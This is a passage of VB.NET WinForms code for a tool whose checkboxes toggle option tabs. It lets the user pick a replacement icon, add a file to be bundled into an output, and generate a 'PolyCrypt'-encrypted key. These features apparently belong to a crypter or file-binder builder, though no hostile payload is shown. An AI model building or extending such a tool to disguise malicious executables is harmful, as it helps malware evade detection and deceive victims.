            CheckBox6.Checked = False

            CheckBox7.Checked = False

            CheckBox8.Checked = False

            CheckBox9.Checked = False

            CheckBox10.Checked = False

            CheckBox11.Checked = False

            CheckBox12.Checked = False

            CheckBox13.Checked = False

            CheckBox14.Checked = False

            CheckBox15.Checked = False

            CheckBox16.Checked = False

            CheckBox17.Checked = False

            CheckBox18.Checked = False

            CheckBox19.Checked = False

            CheckBox20.Checked = False

            CheckBox21.Checked = False

            CheckBox22.Checked = False

            CheckBox23.Checked = False

            CheckBox24.Checked = False

            CheckBox25.Checked = False

        End If
    End Sub

    Private Sub CheckBox72_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox72.CheckedChanged
        If CheckBox72.Checked = True Then

            TabControl1.TabPages(2).Enabled = True

        Else

            TabControl1.TabPages(2).Enabled = False

        End If
    End Sub

    Private Sub CheckBox75_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox75.CheckedChanged
        If CheckBox75.Checked = True Then

            TabControl1.TabPages(5).Enabled = True

        Else

            TabControl1.TabPages(5).Enabled = False

            CheckBox50.Checked = False

            CheckBox51.Checked = False

            CheckBox52.Checked = False

            CheckBox53.Checked = False

            CheckBox54.Checked = False

            CheckBox55.Checked = False

            CheckBox56.Checked = False

            CheckBox57.Checked = False

            CheckBox58.Checked = False

            CheckBox60.Checked = False

            CheckBox61.Checked = False

        End If
    End Sub

    Private Sub CheckBox73_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox73.CheckedChanged
        If CheckBox73.Checked = True Then

            TabControl1.TabPages(3).Enabled = True

        Else

            TabControl1.TabPages(3).Enabled = False

            CheckBox28.Checked = False

            CheckBox30.Checked = False

            CheckBox68.Checked = False

            NumericUpDown5.Value = 0

            RadioButton11.Checked = False

            RadioButton12.Checked = False

            RadioButton13.Checked = False

            RadioButton15.Checked = False

            RadioButton16.Checked = False

        End If
    End Sub

    Private Sub CheckBox74_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox74.CheckedChanged
        If CheckBox74.Checked = True Then

            TabControl1.TabPages(4).Enabled = True

            CheckBox33.Checked = True

            CheckBox34.Checked = True

            CheckBox35.Checked = True

            CheckBox36.Checked = True

            CheckBox37.Checked = True

            CheckBox38.Checked = True

            CheckBox39.Checked = True

            CheckBox40.Checked = True

            CheckBox41.Checked = True

            CheckBox42.Checked = True

            CheckBox43.Checked = True

            CheckBox44.Checked = True

            CheckBox45.Checked = True

            CheckBox46.Checked = True

            CheckBox47.Checked = True

            CheckBox48.Checked = True

            CheckBox70.Checked = True


        Else

            TabControl1.TabPages(4).Enabled = False

            CheckBox33.Checked = False

            CheckBox34.Checked = False

            CheckBox35.Checked = False

            CheckBox36.Checked = False

            CheckBox37.Checked = False

            CheckBox38.Checked = False

            CheckBox39.Checked = False

            CheckBox40.Checked = False

            CheckBox41.Checked = False

            CheckBox42.Checked = False

            CheckBox43.Checked = False

            CheckBox44.Checked = False

            CheckBox45.Checked = False

            CheckBox46.Checked = False

            CheckBox47.Checked = False

            CheckBox48.Checked = False

            CheckBox70.Checked = False

        End If
    End Sub

    Private Sub CheckBox76_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox76.CheckedChanged
        If CheckBox76.Checked = True Then

            TabControl1.TabPages(6).Enabled = True

        Else

            TabControl1.TabPages(6).Enabled = False

        End If
    End Sub

    Private Sub RadioButton15_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RadioButton15.CheckedChanged
        If RadioButton15.Checked = True Then
            NumericUpDown6.Enabled = True
        Else
            NumericUpDown6.Enabled = False
        End If
    End Sub

    Private Sub RadioButton16_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RadioButton16.CheckedChanged
        If RadioButton16.Checked = True Then
            NumericUpDown7.Enabled = True
        Else
            NumericUpDown7.Enabled = False
        End If
    End Sub

    Private Sub CheckBox49_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox49.CheckedChanged
        If CheckBox49.Checked = True Then
            CheckBox33.Checked = True
            CheckBox34.Checked = True
            CheckBox35.Checked = True
            CheckBox36.Checked = True
            CheckBox37.Checked = True
            CheckBox38.Checked = True
            CheckBox39.Checked = True
            CheckBox40.Checked = True
            CheckBox41.Checked = True
            CheckBox42.Checked = True
            CheckBox43.Checked = True
            CheckBox44.Checked = True
            CheckBox45.Checked = True
            CheckBox46.Checked = True
            CheckBox47.Checked = True
            CheckBox48.Checked = True
            CheckBox70.Checked = True
        Else
            CheckBox33.Checked = False
            CheckBox34.Checked = False
            CheckBox35.Checked = False
            CheckBox36.Checked = False
            CheckBox37.Checked = False
            CheckBox38.Checked = False
            CheckBox39.Checked = False
            CheckBox40.Checked = False
            CheckBox41.Checked = False
            CheckBox42.Checked = False
            CheckBox43.Checked = False
            CheckBox44.Checked = False
            CheckBox45.Checked = False
            CheckBox46.Checked = False
            CheckBox47.Checked = False
            CheckBox48.Checked = False
            CheckBox70.Checked = False
        End If
    End Sub
    Dim ooo As New OpenFileDialog
    Private Sub MButton2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButton2.Click
        ooo.DefaultExt = "ico"

        ooo.Filter = "Icon Files (*.ico*)|*.ico*"

        ooo.FilterIndex = 1

        ooo.FileName = ""

        If ooo.ShowDialog(Me) = 1 Then

            TextBox2.Text = ooo.FileName

            Try

                PictureBox2.Image = ReturnIcon(TextBox2.Text, 0).ToBitmap()

            Catch

            End Try

        End If
    End Sub
    Declare Function ExtractIcon Lib "shell32.dll" Alias "ExtractIconExA" (ByVal lpszFile As _
    String, ByVal nIconIndex As Integer, ByRef phiconLarge As Integer, ByRef phiconSmall As _
    Integer, ByVal nIcons As Integer) As Integer
    Private Function ReturnIcon(ByVal Path As String, ByVal Index As Integer, Optional ByVal small As Boolean = False) As Icon

        Dim BI, SI As Integer

        ExtractIcon(Path, Index, BI, SI, 1)

        If BI = 0 Then

            ExtractIcon(Path, 0, BI, SI, 1)

        End If

        If BI <> 0 Then

            If small = False Then

                Return Icon.FromHandle(BI)

            Else

                Return Icon.FromHandle(SI)

            End If

        Else

            Return Nothing

        End If

    End Function

    Private Sub MButton3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButton3.Click
        Dim ofd As New OpenFileDialog

        If ListView1.Items.Count = 1 Then

            MessageBox.Show("You cannot add more files because the author hasn't figured out how to work around the double size bug for the output.", "Attention", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)

            Exit Sub

        End If

        ofd.Filter = "All Files (*.*)|*.*"

        ofd.InitialDirectory = My.Computer.FileSystem.SpecialDirectories.Desktop

        If ofd.ShowDialog = Windows.Forms.DialogResult.OK Then

            For i = 0 To ListView1.Items.Count - 1

                If ListView1.Items.Item(i).Tag = ofd.FileName Then

                    Exit Sub

                End If

            Next

            ImageList1.Images.Add(Path.GetFileName(ofd.FileName), Icon.ExtractAssociatedIcon(ofd.FileName))

            With ListView1.Items.Add(Path.GetFileName(ofd.FileName))

                .SubItems.Add(Path.GetExtension(ofd.FileName))

                Dim size As Long = My.Computer.FileSystem.GetFileInfo(ofd.FileName).Length

                Dim sized As String

                If size > 1024 Then

                    size = size / 1024

                    sized = size.ToString + " KB"

                    If size > 1024 Then

                        size = size / 1024

                        sized = size.ToString + " MB"

                        If size > 1024 Then

                            size = size / 1024

                            sized = size.ToString + " GB"

                        End If

                    End If

                Else

                    sized = size.ToString + " Bytes"

                End If

                .SubItems.Add(sized)

                .ImageIndex = ImageList1.Images.Count - 1

                .Tag = ofd.FileName

            End With

        End If

    End Sub

    Private Sub MButton4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButton4.Click
        Dim item As ListViewItem

        For Each item In ListView1.SelectedItems

            ListView1.Items.Remove(item)

        Next
    End Sub

    Private Sub MButton9_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MButton9.Click
        Dim xx As String
        xx = Guid.NewGuid.ToString & Guid.NewGuid.ToString & Guid.NewGuid.ToString
        Label16.Text = Encryption_Algorithms.PolyCrypt(xx)
    End Sub


End Class
